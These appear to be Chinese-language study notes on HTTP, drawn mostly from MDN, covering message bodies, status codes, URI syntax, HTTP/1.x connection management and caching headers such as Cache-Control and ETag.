+ 请求的最后一部分是它的 body。不是所有的请求都有一个 body：例如获取资源的请求，GET，HEAD，DELETE 和 OPTIONS，**通常它们不需要 body**。 有些请求将数据发送到服务器以便更新数据：常见的的情况是 POST 请求（包含 HTML 表单数据）。
+ Body 大致可分为两类：
  - Single-resource bodies，由一个单文件组成。该类型 body 由两个 header 定义： [`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) 和 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length).
  - [Multiple-resource bodies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#multipartform-data)，由多部分 body 组成，每一部分包含不同的信息位。通常是和  [HTML Forms](https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Forms) 连系在一起。

## HTTP 响应

### 状态行

+ HTTP 响应的起始行被称作 **状态行(status line)**，包含以下信息：
  1. **协议版本**，通常为 `HTTP/1.1。`
  2. **状态码 (status code)**，表明请求是成功或失败。常见的状态码是 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200)，[`404`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404)，或 [`302`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302)。
  3. **状态文本 (status text)**。一个简短的，纯粹的信息，通过状态码的文本描述，帮助人们理解该 HTTP 消息。
+ 一个典型的状态行看起来像这样：`HTTP/1.1 404 Not Found。`

### Headers

+ 响应的  [HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) 遵循和任何其它 header 相同的结构：不区分大小写的字符串，紧跟着的冒号 (`':'`) 和一个结构取决于 header 类型的值。 整个 header（包括其值）表现为**单行形式**。
+ 有许多响应头可用，这些响应头可以分为几组：
  - **General headers，**例如 [`Via`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via)，适用于整个报文。
  - **Response headers，**例如 [`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) 和 [`Accept-Ranges`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Ranges)，提供其它不符合状态行的关于服务器的信息。
  - **Entity headers**，例如 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length)，适用于请求的 body。显然，如果请求中没有任何 body，则不会发送这样的头文件。
+ ![Example of headers in an HTTP response](https://mdn.mozillademos.org/files/13823/HTTP_Response_Headers2.png) 

### Body

+ 响应的最后一部分是 body。不是所有的响应都有 body：具有状态码 (如 [`201`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/201) 或 [`204`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/204)) 的响应，通常不会有 body。
+ Body 大致可分为三类：
  - Single-resource bodies，由**已知**长度的单个文件组成。该类型 body 由两个 header 定义：[`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) 和 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length)。
  - Single-resource bodies，由**未知**长度的单个文件组成，通过将 [`Transfer-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding) 设置为 `chunked 来`使用 chunks 编码。
  - [Multiple-resource bodies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#multipartform-data)，由多部分 body 组成，每部分包含不同的信息段。但这是比较少见的。

## HTTP/2 帧

+ HTTP/1.x 报文有一些性能上的缺点：
  - Header 不像 body，它不会被压缩。
  - 两个报文之间的 header 通常非常相似，但它们仍然在连接中重复传输。
  - 无法复用。当在同一个服务器打开几个连接时：TCP 热连接比冷连接更加有效。
+ HTTP/2 引入了一个额外的步骤：它**将 HTTP/1.x 消息分成帧并嵌入到流 (stream) 中**。数据帧和报头帧分离，这将允许报头压缩。将多个流组合，这是一个被称为 **多路复用 (multiplexing)** 的过程，它允许更有效的底层 TCP 连接。
+ ![HTTP/2 modify the HTTP message to divide them in frames (F:\OneDrive\JS\assets\Binary_framing2.png), allowing for more optimization.](https://mdn.mozillademos.org/files/13819/Binary_framing2.png)
+ HTTP 帧现在对 Web 开发人员是透明的。在 HTTP/2 中，这是一个在  HTTP/1.1 和底层传输协议之间附加的步骤。**Web 开发人员不需要在其使用的 API 中做任何更改来利用 HTTP 帧；当浏览器和服务器都可用时，HTTP/2 将被打开并使用。**

## HTTP 状态码

+ https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status

+ HTTP 响应状态代码指示特定 [HTTP](https://developer.mozilla.org/zh-cn/HTTP) 请求是否已成功完成。响应分为五类：信息响应，成功响应，重定向，客户端错误和服务器错误。状态代码由 [section 10 of RFC 2616](https://tools.ietf.org/html/rfc2616#section-10)定义

### 信息响应

+ 1XX
+ [`100 Continue`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/100)
+ 这个临时响应表明，迄今为止的所有内容都是可行的，客户端应该继续请求，如果已经完成，则忽略它。

### 成功响应

+ [`200 OK`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200)
  + 请求成功。成功的含义取决于HTTP方法：
    + GET：资源已被提取并在消息正文中传输。
    + HEAD：实体标头位于消息正文中。
    + POST：描述动作结果的资源在消息体中传输。
    + TRACE：消息正文包含服务器收到的请求消息

+ 201

+ 202

+ 203

+ [`204 No Content`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/204)

  服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。由于204响应被禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。

+ [`205 Reset Content`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/205)

  服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。与204响应一样，该响应也被禁止包含任何消息体，且以消息头后的第一个空行结束。

### 重定向

+ [`301 Moved Permanently`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/301)

  被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。

+ [`302 Found`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302)

  请求的资源现在临时从不同的 URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。	

+ [`303 See Other`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303)

  对应当前请求的响应可以在另一个 URI 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。

+ [`304 Not Modified`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304)

  如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304 响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。

  **虽然304被划分在3XX，但和重定向一毛钱关系都没有**

+ [`307 Temporary Redirect`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/307)

  临时重定向，和302有着相同含义 
  尽管302标准禁止POST变为GET，但没人听他的 
  而307就会遵照标准，不会从POST变为GET 
  但处理响应行为，各个浏览器可能不同

### 客户端响应

+ [`400 Bad Request`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/400)

  1、语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。

  2、请求参数有误。

+ [`401 Unauthorized`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/401)

  当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。

+ [`403 Forbidden`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/403)

  服务器已经理解请求，但是拒绝执行它。与 401 响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个 404 响应，假如它不希望让客户端获得任何信息。

+ [`404 Not Found`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404)

  请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。

### 服务端响应

+ [`500 Internal Server Error`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/500)

  服务器遇到了不知道如何处理的情况。

+ [`503 Service Unavailable`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/503)

  服务器没有准备好处理请求。 常见原因是服务器因维护或重载而停机。 请注意，与此响应一起，应发送解释问题的用户友好页面。 这个响应应该用于临时条件和 `Retry-After`：如果可能的话，HTTP头应该包含恢复服务之前的估计时间。 网站管理员还必须注意与此响应一起发送的与缓存相关的标头，因为这些临时条件响应通常不应被缓存。

# web资源 URI

- HTTP 请求的内容通称为"资源"。”资源“这一概念非常宽泛，它可以是一份文档，一张图片，或所有其他你能够想到的格式。每个资源都由一个 ([URI](https://developer.mozilla.org/en-US/docs/Glossary/URI)) 来进行标识。
- 一般情况下，资源的名称和位置由同一个 URL（统一资源定位符，它是 URI 的一种）来标识。也有某些特殊情况，资源的名称和位置由不同的 URI 进行标识：例如，待请求的资源希望客户端从另外一个位置访问它。我们可以使用一个特定的首部字段，[`Alt-Svc`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Alt-Svc)，来指示这种情况。

## URLs 与 URNs

### URLs

- URI 的最常见形式是统一资源定位符 ([URL](https://developer.mozilla.org/en-US/docs/Glossary/URL))，它也被称为 *Web 地址*。

  ```html
  https://developer.mozilla.org
  https://developer.mozilla.org/en-US/docs/Learn/
  https://developer.mozilla.org/en-US/search?q=URL
  ```

- 在浏览器的地址栏中输入上述任一地址，浏览器就会加载相应的网页（资源）。

- URL 由多个必须或可选的组件构成。下面给出了一个复杂的 URL：

  ```html
  http://www.example.com:80/path/to/myfile.html?key1=value1&key2=value2#SomewhereInTheDocument
  ```

### URNs

- URN 是另一种形式的 URI，它通过特定命名空间中的唯一名称来标识资源。

  ```html
  urn:isbn:9780141036144
  urn:ietf:rfc:7230
  ```

- 上面两个 URN 标识了下面的资源：

  - 乔治·奥威尔所著的《1984》
  - IETF规范7230，超文本传输协议 (HTTP/1.1)：Message Syntax and Routing.

## 统一资源标识符的语法

### 方案或协议

- ![Protocol](F:\OneDrive\JS\assets\mdn-url-protocol@x2.png)

- `“http://”告诉浏览器使用何种协议。对于大部分 Web 资源，`通常使用 HTTP 协议或其安全版本，HTTPS 协议。另外，浏览器也知道如何处理其他协议。例如， “mailto:” 协议指示浏览器打开邮件客户端；“ftp:”协议指示浏览器处理文件传输。常见的方案有：

| 方案        | 描述                                                         |
| ----------- | ------------------------------------------------------------ |
| data        | [Data URIs](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/data_URIs) |
| file        | 指定主机上文件的名称                                         |
| ftp         | [文件传输协议](https://developer.mozilla.org/en-US/docs/Glossary/FTP) |
| http/https  | [超文本传输协议／安全的超文本传输协议](https://developer.mozilla.org/en-US/docs/Glossary/HTTP) |
| mailto      | 电子邮件地址                                                 |
| ssh         | 安全 shell                                                   |
| tel         | 电话                                                         |
| urn         | 统一资源名称                                                 |
| view-source | 资源的源代码                                                 |
| ws/wss      | （加密的） [WebSocket](https://developer.mozilla.org/zh-CN/docs/WebSockets) 连接 |

### 主机

- ![Domaine Name](https://mdn.mozillademos.org/files/8015/mdn-url-domain@x2.png) 
- `www.example.com 既是一个域名，也代表管理该域名的机构``。`它指示了需要向网络上的哪一台主机发起请求。当然，也可以直接向主机的 [IP address](https://developer.mozilla.org/en-US/docs/Glossary/IP_address) 地址发起请求。但直接使用 IP 地址的场景并不常见。

### 端口

- ![Port](F:\OneDrive\JS\assets\mdn-url-port@x2.png)

- `:80 是端口。`它表示用于访问 Web 服务器上资源的技术“门”。如果访问的该 Web 服务器使用HTTP协议的标准端口（HTTP为80，HTTPS为443）授予对其资源的访问权限，则通常省略此部分。否则端口就是 URI 必须的部分。

### 路径

- ![Path to the file](F:\OneDrive\JS\assets\mdn-url-path@x2.png)

- `/path/to/myfile.html `是 Web 服务器上资源的路径。在 Web 的早期，类似这样的路径表示 Web 服务器上的物理文件位置。现在，它主要是由没有任何物理实体的 Web 服务器抽象处理而成的。

### 查询

- ![Parameters](F:\OneDrive\JS\assets\mdn-url-parameters@x2.png)

- `?key1=value1&key2=value2` 是提供给 Web 服务器的额外参数。这些参数是用 & 符号分隔的键/值对列表。Web 服务器可以在将资源返回给用户之前使用这些参数来执行额外的操作。每个 Web 服务器都有自己的参数规则，想知道特定 Web 服务器如何处理参数的唯一可靠方法是询问该 Web 服务器所有者。

### 片段

- ![Anchor](F:\OneDrive\JS\assets\mdn-url-anchor@x2.png)

- `#SomewhereInTheDocument` 是资源本身的某一部分的一个锚点。锚点代表资源内的一种“书签”，它给予浏览器显示位于该“加书签”点的内容的指示。 例如，在HTML文档上，浏览器将滚动到定义锚点的那个点上；在视频或音频文档上，浏览器将转到锚点代表的那个时间。值得注意的是 # 号后面的部分，也称为片段标识符，永远不会与请求一起发送到服务器。
- https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web
- https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP

# HTTP/1.X的连接管理

+ https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Connection_management_in_HTTP_1.x

+ 连接管理是一个 HTTP 的关键话题：打开和保持连接在很大程度上影响着网站和 Web 应用程序的性能。在 HTTP/1.x 里有多种模型：**短连接**, **长连接**, 和 **HTTP 流水线。**

+ HTTP 的传输协议主要依赖于 TCP 来提供从客户端到服务器端之间的连接。在早期，HTTP 使用一个简单的模型来处理这样的连接。这些连接的生命周期是短暂的：每发起一个请求时都会创建一个新的连接，并在收到应答时立即关闭。

+ 这个简单的模型对性能有先天的限制：打开每一个 TCP 连接都是相当耗费资源的操作。客户端和服务器端之间需要交换好些个消息。当请求发起时，网络延迟和带宽都会对性能造成影响。现代浏览器往往要发起很多次请求(十几个或者更多)才能拿到所需的完整信息，证明了这个早期模型的效率低下。

+ 有两个新的模型在 HTTP/1.1 诞生了。

  + 首先是**长连接模型**，它会保持连接去完成多次**连续的请求**，减少了不断重新打开连接的时间。然后是 HTTP 流水线模型，它还要更先进一些，多个连续的请求甚至都不用等待立即返回就可以被发送，这样就减少了耗费在网络延迟上的时间。

+ ![Compares the performance of the three HTTP/1.x connection models: short-lived connections, persistent connections, and HTTP pipelining.](https://mdn.mozillademos.org/files/13727/HTTP1_x_Connections.png) 

+ > HTTP/2 新增了其它连接管理模型。

+ 要注意的一个重点是 HTTP 的连接管理适用于两个连续节点之间的连接，如 [hop-by-hop](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#hbh)，而不是 [end-to-end](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#e2e)。当模型用于从客户端到第一个代理服务器的连接和从代理服务器到目标服务器之间的连接时(或者任意中间代理)效果可能是不一样的。HTTP 协议头受不同连接模型的影响，比如 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 和 [`Keep-Alive`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Keep-Alive)，就是 [hop-by-hop](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#hbh) 协议头，它们的值是可以被中间节点修改的。

### 短连接

+ HTTP 最早期的模型，也是  HTTP/1.0 的默认模型，是短连接。每一个 HTTP 请求都由它自己独立的连接完成；这意味着发起每一个 HTTP 请求之前都会有一次 TCP 握手，而且是连续不断的。

+ TCP 协议握手本身就是耗费时间的，所以 TCP 可以保持更多的热连接来适应负载。短连接破坏了 TCP 具备的能力，新的冷连接降低了其性能。

+ 这是 HTTP/1.0 的默认模型(如果没有指定 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 协议头，或者是值被设置为 `close`)。而在 HTTP/1.1 中，只有当 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 被设置为 `close` 时才会用到这个模型。

### 长连接

+ 短连接有两个比较大的问题：创建新连接耗费的时间尤为明显，另外 TCP 连接的性能只有在该连接被使用一段时间后(热连接)才能得到改善。为了缓解这些问题，**长连接** 的概念便被设计出来了，甚至在 HTTP/1.1 之前。或者这被称之为一个 **keep-alive** 连接。

+ 一个长连接会保持一段时间，重复用于发送一系列请求，节省了新建 TCP 连接握手的时间，还可以利用 TCP 的性能增强能力。当然这个连接也不会一直保留着：连接在空闲一段时间后会被关闭(服务器可以使用 [`Keep-Alive`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Keep-Alive) **协议头**来指定一个最小的连接保持时间)。

+ 长连接也还是有缺点的；就算是在空闲状态，它还是会消耗服务器资源，而且在重负载时，还有可能遭受 [DoS attacks](https://developer.mozilla.org/en-US/docs/Glossary/DoS_attack) 攻击。这种场景下，可以使用非长连接，即尽快关闭那些空闲的连接，也能对性能有所提升。

+ HTTP/1.0 里默认并不使用长连接。把 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 设置成 `close` 以外的其它参数都可以让其保持长连接，通常会设置为 `retry-after。`

+ 在 HTTP/1.1 里，默认就是长连接的，协议头都不用再去声明它(但我们还是会把它加上，万一某个时候因为某种原因要退回到 HTTP/1.0 呢)。

### HTTP 流水线

+ 由于这些原因，流水线已经被更好的算法给代替，如 **multiplexing**，已经用在 HTTP/2。

### 域名分片

+ 除非你有紧急而迫切的需求，不要使用这一过时的技术，升级到 HTTP/2 就好了。在 HTTP/2 里，做域名分片就没必要了：HTTP/2 的连接可以很好的处理并发的无优先级的请求。域名分片甚至会影响性能。大多数 HTTP/2 的实现还会使用一种称作[连接凝聚](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/I%20wonder%20if%20it's%20related%20to%20the%20nobash/nobreak/nopick%20secret%20exit%20s%20of%20Elrond's%20chambers.)的技术去尝试合并被分片的域名。

# HTTP 缓存

+ 重用已获取的资源能够有效的提升网站与应用的性能。Web 缓存能够减少延迟与网络阻塞，进而减少显示某个资源所用的时间。借助 HTTP 缓存，Web 站点变得更具有响应性。

## 各种类型的缓存

+ 缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。当 web 缓存发现请求的资源已经被存储，它会拦截请求，返回该资源的拷贝，而不会去源服务器重新下载。
+ 这样带来的好处有：缓解服务器端压力，提升性能(获取资源的耗时更短了)。对于网站来说，缓存是达到高性能的重要组成部分。缓存需要合理配置，因为并不是所有资源都是永久不变的：重要的是对一个资源的缓存应截止到其下一次发生改变（即不能缓存过期的资源）。
+ 缓存的种类有很多,其大致可归为两类：**私有与共享缓存**。共享缓存存储的响应能够被多个用户使用。私有缓存只能用于单独用户。
+ 本文将主要介绍**浏览器与代理缓存**，除此之外还有网关缓存、CDN、反向代理缓存和负载均衡器等部署在服务器上，为站点和 web 应用提供更好的稳定性、性能和扩展性。

### (私有)浏览器缓存

+ 私有缓存只能用于单独用户。你可能已经见过浏览器设置中的“缓存”选项。浏览器缓存拥有用户通过 [HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP) 下载的所有文档。这些缓存为浏览过的文档提供向后/向前导航，保存网页，查看源码等功能，可以避免再次向服务器发起多余的请求。它同样可以提供缓存内容的离线浏览。

### (共享)代理缓存

+ 共享缓存可以被多个用户使用。例如，ISP 或你所在的公司可能会架设一个 web 代理来作为本地网络基础的一部分提供给用户。这样热门的资源就会被重复使用，减少网络拥堵与延迟。

## 缓存操作的目标

+ 虽然 HTTP 缓存不是必须的，但重用缓存的资源通常是必要的。
+ 然而常见的 HTTP 缓存只能存储 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 响应，对于其他类型的响应则无能为力。
+ 缓存的关键主要包括request method和目标URI（一般只有GET请求才会被缓存）。 普遍的缓存案例:
  + 一个检索请求的成功响应: 对于 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)请求，响应状态码为：[`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200)，则表示为成功。一个包含例如HTML文档，图片，或者文件的响应。
  + 永久重定向: 响应状态码：[`301`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/301)。
  + 错误响应: 响应状态码：[`404`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404) 的一个页面。
  + 不完全的响应: 响应状态码 [`206`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206)，只返回局部的信息。
  + 除了 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 请求外，如果匹配到作为一个已被定义的cache键名的响应。
+ 针对一些特定的请求，也可以通过关键字区分多个存储的不同响应以组成缓存的内容。具体参考[下文](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ#Varying_responses)关于 [`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) 的信息。

## 缓存控制

### Cache-control 头

+ HTTP/1.1定义的 [`Cache-Control`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control) 头用来区分对缓存机制的支持情况， 请求头和响应头都支持这个属性。通过它提供的不同的值来定义缓存策略。

#### 禁止进行缓存

+ 缓存中不得存储任何关于客户端请求和服务端响应的内容。每次由客户端发起的请求都会下载完整的响应内容。

  ```js
  Cache-Control: no-store
  Cache-Control: no-cache, no-store
  ```

#### 强制确认缓存

+ 如下头部定义，此方式下，每次有请求发出时，缓存会将此请求发到服务器（译者注：该请求应该会带有与本地缓存相关的验证字段），服务器端会验证请求中所描述的缓存是否过期，若未过期（注：实际就是返回304），则缓存才使用本地缓存副本。

  ```js
  Cache-Control: must-revalidate
  ```

#### 私有缓存和公共缓存

+ "public" 指令表示该响应可以被任何中间人（译者注：比如中间代理、CDN等）缓存。若指定了"public"，则一些通常不被中间人缓存的页面（译者注：因为默认是private）（比如 带有HTTP验证信息（帐号密码）的页面 或 某些特定影响状态码的页面），将会被其缓存。

+ 而 "private" 则表示该响应是专用于某单个用户的，中间人不能缓存此响应，该响应只能应用于浏览器私有缓存中。

  ```js
  Cache-Control: private
  Cache-Control: public
  ```

#### 缓存过期机制

+ 过期机制中，最重要的指令是 "`max-age=<seconds>`"，表示资源能够被缓存（保持新鲜）的最大时间。相对[Expires](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires)而言，max-age是距离请求发起的时间的秒数。针对应用中那些不会改变的文件，通常可以手动设置一定的时长以保证缓存有效，例如图片、css、js等静态资源。

  ```js
  Cache-Control: max-age=31536000
  ```

#### 缓存验证确认

+ 当使用了 "`must-revalidate`" 指令，那就意味着缓存在考虑使用一个陈旧的资源时，必须先验证它的状态，已过期的缓存将不被使用。详情看下文关于[缓存校验](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ#Cache_validation)的内容。

### Pragma 头

+ [`Pragma`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Pragma) 是HTTP/1.0标准中定义的一个header属性，请求中包含Pragma的效果跟在头信息中定义Cache-Control: no-cache相同，但是HTTP的响应头不支持这个属性，所以它不能拿来完全替代HTTP/1.1中定义的Cache-control头。通常定义Pragma以向后兼容基于HTTP/1.0的客户端。

## 新鲜度

+ 理论上来讲，当一个资源被缓存存储后，该资源应该可以被永久存储在缓存中。

+ 由于缓存只有有限的空间用于存储资源副本，所以缓存会定期地将一些副本删除，这个过程叫做**缓存驱逐**。

+ 另一方面，当服务器上面的资源进行了更新，那么缓存中的对应资源也应该被更新，由于HTTP是C/S模式的协议，服务器更新一个资源时，不可能直接通知客户端及其缓存，所以双方必须为该资源约定一个过期时间，在该过期时间之前，该资源（缓存副本）就是新鲜的，当过了过期时间后，该资源（缓存副本）则变为陈旧的*。*

+ **驱逐算法**用于将陈旧的资源（缓存副本）替换为新鲜的，注意，一个陈旧的资源（缓存副本）是不会直接被清除或忽略的，当客户端发起一个请求时，缓存检索到已有一个对应的陈旧资源（缓存副本），则缓存会先将此请求附加一个`If-None-Match`头，然后发给目标服务器，以此来检查该资源副本是否是依然还是算新鲜的，若服务器返回了 [`304`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/304) (Not Modified)（该响应不会有带有实体信息），则表示此资源副本是新鲜的，这样一来，可以节省一些带宽。

+ 若服务器通过 If-None-Match 或 If-Modified-Since判断后发现已过期，那么会带有该资源的实体内容返回。

+ 下面是上述缓存处理过程的一个图示：

  ![Show how a proxy cache acts when a doc is not cache, in the cache and fresh, in the cache and stale.](https://mdn.mozillademos.org/files/13771/HTTPStaleness.png)

  +  对于含有特定头信息的请求，会去计算缓存寿命。比如`Cache-control: max-age=N`的头，相应的缓存的寿命就是`N`。通常情况下，对于不含这个属性的请求则会去查看是否包含[Expires](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires)属性，通过比较Expires的值和头里面[Date](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Date)属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的[Last-Modified](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified)信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%）。

+ 缓存失效时间计算公式如下：

  ```js
  expirationTime = responseTime + freshnessLifetime - currentAge
  ```

  + 上式中，`responseTime` 表示浏览器接收到此响应的那个时间点。

### 加速资源

+ 更多地利用缓存资源，可以提高网站的性能和响应速度。为了优化缓存，过期时间设置得尽量长是一种很好的策略。对于定期或者频繁更新的资源，这么做是比较稳妥的，但是对于那些长期不更新的资源会有点问题。这些固定的资源在一定时间内受益于这种长期保持的缓存策略，但一旦要更新就会很困难。特指网页上引入的一些js/css文件，当它们变动时需要尽快更新线上资源。
+ web开发者发明了一种被 Steve Souders 称之为 `revving` 的技术[[1\]](https://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/) 。不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。
+ 这种方法还有一个好处：同时更新两个缓存资源不会造成部分缓存先更新而引起新旧文件内容不一致。对于互相有依赖关系的css和js文件，避免这种不一致性是非常重要的。
+ ![img](https://mdn.mozillademos.org/files/13779/HTTPRevved.png) 
+ 加在加速文件后面的版本号不一定是一个正式的版本号字符串，如1.1.3这样或者其他固定自增的版本数。它可以是任何防止缓存碰撞的标记例如hash或者时间戳。

## 缓存验证

+ 用户点击刷新按钮时会开始缓存验证。如果缓存的响应头信息里含有"Cache-control: must-revalidate”的定义，在浏览的过程中也会触发缓存验证。另外，在浏览器偏好设置里设置Advanced->Cache为强制验证缓存也能达到相同的效果。
+ 当缓存的文档过期后，需要进行缓存验证或者重新获取资源。只有在服务器返回强校验器或者弱校验器时才会进行验证。

### ETags

+ 作为缓存的一种强校验器，[`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 响应头是一个对用户代理(User Agent, 下面简称UA)不透明（译者注：UA 无需理解，只需要按规定使用即可）的值。对于像浏览器这样的HTTP UA，不知道ETag代表什么，不能预测它的值是多少。如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 [`If-None-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match) 头来验证缓存。
+ [`Last-Modified`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified) 响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。如果响应头里含有这个信息，客户端可以在后续的请求中带上 [`If-Modified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since) 来验证缓存。
+ 当向服务端发起缓存校验的请求时，服务端会返回 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200) ok表示返回正常的结果或者 [`304`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304) Not Modified(不返回body)表示浏览器可以使用本地缓存文件。304的响应头也可以同时更新缓存文档的过期时间。

### 带Vary头的响应

+ [`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) HTTP 响应头决定了对于后续的请求头，如何判断是请求一个新的资源还是使用缓存的文件。

